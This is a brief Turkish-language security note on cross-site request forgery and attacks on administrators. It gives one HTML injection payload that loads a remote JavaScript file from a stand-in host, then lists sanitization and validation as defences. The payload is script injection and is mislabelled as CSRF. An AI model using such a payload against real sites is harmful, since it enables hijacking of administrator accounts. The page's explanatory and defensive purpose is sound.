---
glightbox: true
icon: material/circle-small
---

# Cross-Site Request Forgery (CSRF)

CSRF, yöneticilere saldırmak ve yönetici hesaplarına erişim sağlamak için kullanılabilir. Yöneticilerin genellikle hassas fonksiyonlara erişimi vardır ve bunlar arka uç sunucusuna saldırmak için kullanılabilir. Aşağıdaki örnek ile uzak makineye bir JavaScript kodu yüklenmiştir:

```html
"><script src=//www.example.com/exploit.js></script>
```

Kullanıcı girdisi kabul edilirken iki ana kontrolün uygulanması gerekir:

1. Sanitization
2. Validation
